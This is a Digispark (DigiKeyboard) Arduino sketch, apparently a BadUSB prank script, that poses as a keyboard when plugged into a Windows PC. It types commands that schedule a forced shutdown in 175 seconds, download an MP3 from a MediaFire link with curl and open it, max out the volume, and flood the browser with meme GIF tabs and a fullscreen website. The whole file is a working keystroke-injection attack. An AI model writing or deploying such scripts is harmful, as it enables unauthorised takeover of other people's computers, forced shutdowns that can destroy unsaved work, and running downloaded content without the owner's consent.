// Script by @KamilSuchecki
#include "DigiKeyboard.h"
// cmd variable
void cmd()
{
  DigiKeyboard.delay(50);
  DigiKeyboard.sendKeyStroke(0, MOD_GUI_LEFT);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("cmd");
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);
}
void setup() {
  // delay before run
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(3000);

  // shutdown pc in 175 seconds, download mp3 file and play it
  cmd();
  DigiKeyboard.print("shutdown /s /t 175 -c \" \" && curl.exe --output index.html --url https://download1338.mediafire.com/oaopda1xdqqg/tepc4kzzae6t3vx/audio.mp3 && start index.html");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  
  // volume up
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("sndvol.exe");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  for (int i = 1; i <= 100; i++){
  DigiKeyboard.sendKeyStroke(82);
  }
  DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT); 
  DigiKeyboard.delay(500);
  DigiKeyboard.delay(15000);
  
  // picture1
  DigiKeyboard.sendKeyStroke(KEY_N, MOD_CONTROL_LEFT);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("https://c.tenor.com/eRX2PdFWV1gAAAAC/okrutnik-cenzopapa.gif");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(5000);
  
  // picture2
  DigiKeyboard.sendKeyStroke(KEY_N, MOD_CONTROL_LEFT);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("https://c.tenor.com/WYP17svkMfYAAAAC/okrutnik-cenzopapa.gif");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(5000);
  
  // picture3
  DigiKeyboard.sendKeyStroke(KEY_N, MOD_CONTROL_LEFT);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("https://i.makeagif.com/media/3-25-2017/gbKYlJ.gif");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(5000);
  
  // 20 new tabs
  for (int i = 0; i <= 20; i++)
  {
    DigiKeyboard.sendKeyStroke(KEY_N, MOD_CONTROL_LEFT);
    DigiKeyboard.delay(100);
  }
  
  // windows 93 site
  DigiKeyboard.delay(5000);
  DigiKeyboard.print("https://www.windows93.net/");
  DigiKeyboard.delay(50);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_F11);
}

void loop() {

}
